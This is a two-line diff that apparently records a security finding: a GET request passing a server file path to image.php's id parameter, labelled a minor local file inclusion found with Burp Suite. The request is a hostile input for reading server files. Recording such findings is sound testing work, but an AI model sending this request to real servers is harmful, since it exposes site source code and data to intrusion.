@@ -1,0 +1,2 @@
+GET /image.php?id=/var/www/html/dashboard.php HTTP/1.1
+(Minor) Local file intrusion through burpsuite.
